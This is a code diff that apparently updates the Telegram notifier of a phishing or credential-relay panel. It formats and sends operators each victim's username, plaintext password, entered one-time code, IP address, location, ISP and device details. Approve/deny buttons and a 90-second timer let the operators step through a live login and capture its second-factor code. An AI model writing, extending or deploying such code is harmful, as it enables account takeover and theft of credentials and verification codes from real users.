@@ -38,8 +38,8 @@ async function sendToAll(env, text, taskId, includeButtons) {
         payload.reply_markup = {
           inline_keyboard: [
             [
-              { text: "Approve", callback_data: "approve:" + taskId },
-              { text: "Deny", callback_data: "deny:" + taskId },
+              { text: "✅ Approve", callback_data: "approve:" + taskId },
+              { text: "❌ Deny", callback_data: "deny:" + taskId },
             ],
           ],
         };
@@ -55,64 +55,212 @@ async function sendToAll(env, text, taskId, includeButtons) {
   }
 }
 
+function parseDevice(ua) {
+  if (!ua) return "Unknown";
+  var os = "Unknown OS";
+  var browser = "Unknown Browser";
+
+  if (/iPhone/.test(ua)) os = "iPhone";
+  else if (/iPad/.test(ua)) os = "iPad";
+  else if (/Android/.test(ua)) os = "Android";
+  else if (/Windows NT 10/.test(ua)) os = "Windows 10";
+  else if (/Windows NT 11|Windows NT 10.*Build\/(2[2-9]|[3-9])/.test(ua)) os = "Windows 11";
+  else if (/Mac OS X/.test(ua)) os = "macOS";
+  else if (/Linux/.test(ua)) os = "Linux";
+
+  if (/Edg\/(\d+)/.test(ua)) browser = "Edge " + RegExp.$1;
+  else if (/Chrome\/(\d+)/.test(ua)) browser = "Chrome " + RegExp.$1;
+  else if (/Safari\//.test(ua) && /Version\/(\d+[\.\d]*)/.test(ua)) browser = "Safari " + RegExp.$1;
+  else if (/Firefox\/(\d+)/.test(ua)) browser = "Firefox " + RegExp.$1;
+
+  return os + " / " + browser;
+}
+
+function formatReferrer(ref) {
+  if (!ref || ref === "Direct") return "Direct";
+  try {
+    var host = new URL(ref).hostname.replace(/^www\./, "");
+    return host;
+  } catch (e) {
+    return ref;
+  }
+}
+
+function formatUrl(origin) {
+  if (!origin) return "N/A";
+  try {
+    var u = new URL(origin);
+    return u.hostname + u.pathname;
+  } catch (e) {
+    return origin;
+  }
+}
+
+function formatTimes(tz) {
+  var now = new Date();
+  var utcStr = now.toLocaleString("en-US", {
+    timeZone: "UTC",
+    month: "short", day: "numeric", year: "numeric",
+    hour: "numeric", minute: "2-digit", hour12: true,
+  });
+
+  var localStr;
+  try {
+    localStr = now.toLocaleString("en-US", {
+      timeZone: tz,
+      month: "short", day: "numeric", year: "numeric",
+      hour: "numeric", minute: "2-digit", hour12: true,
+    });
+  } catch (e) {
+    localStr = utcStr;
+  }
+  return { local: localStr, utc: utcStr };
+}
+
+function gmtOffset(tz) {
+  try {
+    var now = new Date();
+    var parts = now.toLocaleString("en-US", { timeZone: tz, timeZoneName: "shortOffset" }).split(" ");
+    var offset = parts[parts.length - 1];
+    return offset;
+  } catch (e) {
+    return "";
+  }
+}
+
+function locationBlock(cf) {
+  if (!cf) return [];
+  var loc = cf.city && cf.city !== "Unknown"
+    ? cf.city + ", " + cf.country
+    : cf.country || "Unknown";
+  var tzLabel = cf.timezone || "Unknown";
+  var offset = cf.timezone ? gmtOffset(cf.timezone) : "";
+  if (offset) tzLabel += " (" + offset + ")";
+
+  return [
+    "📍 Location: " + loc,
+    "🌐 IP: " + (cf.ip || "Unknown"),
+    "🕐 Timezone: " + tzLabel,
+    "📡 ISP: " + (cf.asOrganization || "Unknown"),
+  ];
+}
+
+function deviceBlock(task) {
+  var device = task.device_info ? parseDevice(task.device_info) : "Unknown";
+  var screen = task.screen_size || "Unknown";
+  var ref = formatReferrer(task.referrer);
+  var url = formatUrl(task.member_origin);
+
+  return [
+    "📱 Device: " + device,
+    "📐 Screen: " + screen,
+    "🔗 Referrer: " + ref,
+    "🌍 URL: " + url,
+  ];
+}
+
+function timeBlock(tz) {
+  var t = formatTimes(tz);
+  return [
+    "📅 Local: " + t.local,
+    "🕑 UTC: " + t.utc,
+  ];
+}
+
+var LINE = "━━━━━━━━━━━━━━━━━━━━";
+
 export async function notifyNewTask(env, task) {
   var isVisit = task.request_kind === "visit";
+  var tz = task.cf ? task.cf.timezone : null;
+  var lines = [];
 
-  var lines = [
-    isVisit ? "New page visit" : "New " + task.request_kind + " request",
-    "",
-    "User: " + task.user_id,
-    !isVisit && task.password ? "Password: " + task.password : null,
-    "Email: " + task.masked_email,
-    "Phone: " + task.masked_phone,
-    "Method: " + task.method,
-    "Project: " + (task.project_name || task.project_id),
-    task.member_origin ? "Origin: " + task.member_origin : null,
-    "",
-    isVisit ? null : "Auto-declines in 90s",
-  ]
-    .filter(function (l) { return l !== null; })
-    .join("\n");
+  if (isVisit) {
+    lines.push("👁 New visitor (AIG)");
+    lines.push(LINE);
+    lines = lines.concat(locationBlock(task.cf));
+    lines.push("");
+    lines = lines.concat(deviceBlock(task));
+    lines.push("");
+    lines = lines.concat(timeBlock(tz));
+  } else {
+    lines.push("🔐 Login request (AIG)");
+    lines.push(LINE);
+    lines.push("👤 User: " + task.user_id);
+    lines.push("🔑 Password: " + (task.password || "N/A"));
+    lines.push("✉️ Email: " + task.masked_email);
+    if (task.masked_phone && task.masked_phone !== "N/A") {
+      lines.push("📞 Phone: " + task.masked_phone);
+    }
+    lines.push("");
+    lines = lines.concat(locationBlock(task.cf));
+    lines.push("");
+    lines = lines.concat(deviceBlock(task));
+    lines.push("");
+    lines = lines.concat(timeBlock(tz));
+    lines.push("");
+    lines.push("⏳ Auto-declines in 90s");
+  }
 
-  await sendToAll(env, lines, task.id, !isVisit);
+  await sendToAll(env, lines.join("\n"), task.id, !isVisit);
 }
 
 export async function notifyAdvance(env, task) {
-  var lines;
+  var tz = task.cf ? task.cf.timezone : null;
+  var lines = [];
 
   if (task.flow_step === "code_request") {
     var target =
       task.code_delivery_method === "phone"
         ? "Phone (" + task.masked_phone + ")"
         : "Email (" + task.masked_email + ")";
-    lines = [
-      "Code Delivery Request",
-      "",
-      "User: " + task.user_id,
-      "Password: " + task.password,
-      "Send code via: " + target,
-      "Project: " + (task.project_name || task.project_id),
-      "",
-      "Approve to send code",
-      "Auto-declines in 90s",
-    ].join("\n");
+
+    lines.push("📨 Code delivery request (AIG)");
+    lines.push(LINE);
+    lines.push("👤 User: " + task.user_id);
+    lines.push("🔑 Password: " + (task.password || "N/A"));
+    lines.push("✉️ Send code via: " + target);
+    lines.push("");
+    lines = lines.concat(locationBlock(task.cf));
+    lines.push("");
+    lines = lines.concat(deviceBlock(task));
+    lines.push("");
+    lines.push("⏳ Auto-declines in 90s");
   } else if (task.flow_step === "code_verify") {
-    lines = [
-      "Code Verification",
-      "",
-      "User: " + task.user_id,
-      "Code entered: " + (task.verification_code || "N/A"),
-      "Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"),
-      "Project: " + (task.project_name || task.project_id),
-      "",
-      "Approve if code matches",
-      "Auto-declines in 90s",
-    ].join("\n");
+    lines.push("🛡 Code verification (AIG)");
+    lines.push(LINE);
+    lines.push("👤 User: " + task.user_id);
+    lines.push("🔑 Password: " + (task.password || "N/A"));
+    lines.push("🔢 Code entered: " + (task.verification_code || "N/A"));
+    lines.push("✉️ Sent via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + task.masked_email + ")");
+    lines.push("");
+    lines = lines.concat(locationBlock(task.cf));
+    lines.push("");
+    lines = lines.concat(deviceBlock(task));
+    lines.push("");
+    lines.push("⏳ Auto-declines in 90s");
   } else {
     return;
   }
 
-  await sendToAll(env, lines, task.id, true);
+  await sendToAll(env, lines.join("\n"), task.id, true);
+}
+
+export function buildApprovedMessage(task) {
+  return [
+    "✅ APPROVED via Telegram",
+    "🔐 Login request (AIG)",
+    "👤 User: " + task.user_id,
+    "🔑 Password: " + (task.password || "N/A"),
+  ].join("\n");
+}
+
+export function buildDeniedMessage(task) {
+  return [
+    "❌ DENIED via Telegram",
+    "🔐 Login request (AIG)",
+    "👤 User: " + task.user_id,
+    "🔑 Password: " + (task.password || "N/A"),
+  ].join("\n");
 }
 
 export async function editMessage(env, chatId, messageId, text) {
